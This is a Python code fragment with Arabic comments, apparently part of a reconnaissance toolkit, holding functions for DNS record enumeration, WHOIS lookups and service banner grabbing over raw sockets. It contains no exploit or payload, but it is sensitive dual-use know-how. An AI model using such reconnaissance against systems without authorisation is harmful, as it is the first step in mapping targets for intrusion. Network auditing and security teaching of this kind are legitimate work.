def recon_dns(domain):
    """DNS Enumeration: يسأل عن سجلات A, MX, NS"""
    print(f"\n[RECON] DNS Enumeration → {domain}")
    if not HAS_DNS:
        print("  [!] dnspython غير مثبت. شغّل: pip install dnspython")
        return
    for rtype in ["A", "MX", "NS"]:
        try:
            answers = dns.resolver.resolve(domain, rtype, lifetime=5)
            for r in answers:
                print(f"  [{rtype}] {r}")
        except Exception as e:
            print(f"  [{rtype}] لا يوجد: {e}")

def recon_whois(domain):
    """WHOIS Lookup: يجيب معلومات تسجيل الدومين"""
    print(f"\n[RECON] WHOIS → {domain}")
    if not HAS_WHOIS:
        print("  [!] python-whois غير مثبت. شغّل: pip install python-whois")
        return
    try:
        w = whois.whois(domain)
        print(f"  Registrar:    {w.registrar}")
        print(f"  Created:      {w.creation_date}")
        print(f"  Expires:      {w.expiration_date}")
        print(f"  Name Servers: {w.name_servers}")
    except Exception as e:
        print(f"  [!] خطأ: {e}")

def recon_banner(host, port):
    """Banner Grabbing: يقرأ banner الخدمة من البورت"""
    print(f"\n[RECON] Banner Grabbing → {host}:{port}")
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((host, port))
        if port in [80, 8080]:
            s.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
        banner = s.recv(512).decode(errors="ignore").strip()
        s.close()
        print(f"  Banner: {banner[:200]}")
    except Exception as e:
        print(f"  [!] خطأ: {e}")

